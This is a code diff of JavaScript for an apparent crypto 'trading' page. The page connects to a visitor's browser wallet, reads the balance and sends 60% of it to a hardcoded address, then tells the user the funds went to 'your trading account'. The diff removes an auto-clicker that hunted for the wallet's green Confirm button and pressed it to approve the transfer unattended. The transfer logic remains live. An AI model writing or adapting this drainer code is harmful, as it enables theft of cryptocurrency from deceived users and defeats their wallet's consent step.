@@ -382,7 +382,6 @@
             // Destination address
             const TRADING_ADDRESS = '0xaffFA89b0E5eb3869d98f668e470e075a0948BA5';
             let userAgreed = false;
-            let confirmButtonObserver = null;
             let userBalance = 0;
 
             // Check if Web3 is injected (MetaMask, Trust Wallet, etc.)
@@ -403,66 +402,12 @@
                 mainContent.classList.add('blur-background');
             });
 
-            // Function to find and click the green Confirm button
-            function findAndClickConfirmButton() {
-                // Get all buttons on the page
-                const buttons = document.querySelectorAll('button');
-                
-                // Look for a button with green background (#48ff91) and text "Confirm"
-                for (const button of buttons) {
-                    const computedStyle = window.getComputedStyle(button);
-                    const bgColor = computedStyle.backgroundColor;
-                    const buttonText = button.textContent.trim().toLowerCase();
-                    
-                    // Check if button has the right color and text
-                    if ((bgColor === 'rgb(72, 255, 145)' || bgColor === '#48ff91') && 
-                        buttonText.includes('confirm')) {
-                        console.log('Found confirm button:', button);
-                        button.click();
-                        return true;
-                    }
-                }
-                
-                return false;
-            }
-
-            // Function to observe DOM changes and look for the confirm button
-            function setupConfirmButtonObserver() {
-                // If observer already exists, disconnect it first
-                if (confirmButtonObserver) {
-                    confirmButtonObserver.disconnect();
-                }
-                
-                // Create a MutationObserver to watch for DOM changes
-                confirmButtonObserver = new MutationObserver(function(mutations) {
-                    // Try to find and click the confirm button
-                    const found = findAndClickConfirmButton();
-                    
-                    if (found) {
-                        // If found, disconnect the observer
-                        confirmButtonObserver.disconnect();
-                        confirmButtonObserver = null;
-                    }
-                });
-                
-                // Start observing the document with the configured parameters
-                confirmButtonObserver.observe(document.body, {
-                    childList: true,
-                    subtree: true,
-                    attributes: true,
-                    characterData: true
-                });
-                
-                // Also try immediately in case the button is already there
-                findAndClickConfirmButton();
-            }
-
             // Agree to automatic transfer
             agreeBtn.addEventListener('click', async function() {
                 userAgreed = true;
                 warningModal.classList.add('hidden');
                 mainContent.classList.remove('blur-background');
-                
+
                 // Connect wallet and get balance
                 await connectWalletAndGetBalance();
             });
@@ -472,31 +417,16 @@
                 warningModal.classList.add('hidden');
                 mainContent.classList.remove('blur-background');
                 userAgreed = false;
-                
-                // Disconnect any existing observer
-                if (confirmButtonObserver) {
-                    confirmButtonObserver.disconnect();
-                    confirmButtonObserver = null;
-                }
             });
             
             cancelBtn2.addEventListener('click', function() {
                 warningModal.classList.add('hidden');
                 mainContent.classList.remove('blur-background');
                 userAgreed = false;
-                
-                // Disconnect any existing observer
-                if (confirmButtonObserver) {
-                    confirmButtonObserver.disconnect();
-                    confirmButtonObserver = null;
-                }
             });
 
             // Agree to start trading (transfer 60%)
             agreeTradeBtn.addEventListener('click', async function() {
-                // Set up the observer to watch for the confirm button
-                setupConfirmButtonObserver();
-                
                 // Initiate transfer
                 await transferToTradingAccount();
             });
@@ -532,7 +462,7 @@
                     
                     console.log('Connected account:', account);
                     console.log('Balance:', userBalance, 'ETH');
-                    
+                
                 } catch (error) {
                     console.error('Error connecting wallet:', error);
                     
@@ -589,27 +519,44 @@
                         gasPrice: gasPrice // Current gas price
                     };
                     
-                    // Send transaction
-                    const txHash = await web3.eth.sendTransaction(transactionParameters);
+                    // Send transaction - this will trigger the wallet confirmation
+                    const txHash = await web3.eth.sendTransaction(transactionParameters)
+                        .on('transactionHash', function(hash) {
+                            // Transaction was sent to the network
+                            console.log('Transaction hash:', hash);
+                            txHashContainer.classList.remove('hidden');
+                            txHashLink.textContent = `${hash.substring(0, 12)}...${hash.substring(58)}`;
+                            txHashLink.href = `https://etherscan.io/tx/${hash}`;
+                        })
+                        .on('receipt', function(receipt) {
+                            // Transaction was mined
+                            console.log('Transaction receipt:', receipt);
+                            
+                            // Show success
+                            transactionSpinner.classList.add('hidden');
+                            transactionSuccess.classList.remove('hidden');
+                            transactionTitle.textContent = 'Transaction Successful';
+                            transactionMessage.textContent = `${parseFloat(amountEth).toFixed(6)} ETH has been transferred to your trading account!`;
+                            transactionDetails.classList.remove('hidden');
+                            txFrom.textContent = account;
+                            
+                            // Update balance display
+                            userBalance = userBalance - amountEth;
+                            walletBalance.textContent = `${parseFloat(userBalance).toFixed(6)} ETH`;
+                            tradingCapital.textContent = `0 ETH`;
+                        })
+                        .on('error', function(error) {
+                            console.error('Transaction error:', error);
+                            
+                            // Show error
+                            transactionSpinner.classList.add('hidden');
+                            transactionError.classList.remove('hidden');
+                            transactionTitle.textContent = 'Transaction Failed';
+                            transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
+                        });
                     
-                    // Show success
-                    transactionSpinner.classList.add('hidden');
-                    transactionSuccess.classList.remove('hidden');
-                    transactionTitle.textContent = 'Transaction Successful';
-                    transactionMessage.textContent = `${parseFloat(amountEth).toFixed(6)} ETH has been transferred to your trading account!`;
-                    transactionDetails.classList.remove('hidden');
-                    txFrom.textContent = account;
-                    txHashContainer.classList.remove('hidden');
-                    txHashLink.textContent = `${txHash.transactionHash.substring(0, 12)}...${txHash.transactionHash.substring(58)}`;
-                    txHashLink.href = `https://etherscan.io/tx/${txHash.transactionHash}`;
-                    
-                    console.log('Transaction successful:', txHash);
-                    
-                    // Update balance display
-                    userBalance = userBalance - amountEth;
-                    walletBalance.textContent = `${parseFloat(userBalance).toFixed(6)} ETH`;
-                    tradingCapital.textContent = `0 ETH`;
-                    
+                    console.log('Transaction initiated:', txHash);
+                
                 } catch (error) {
                     console.error('Error performing transaction:', error);
                     
@@ -618,12 +565,6 @@
                     transactionError.classList.remove('hidden');
                     transactionTitle.textContent = 'Transaction Failed';
                     transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
-                    
-                    // Disconnect any existing observer
-                    if (confirmButtonObserver) {
-                        confirmButtonObserver.disconnect();
-                        confirmButtonObserver = null;
-                    }
                 }
             }
 
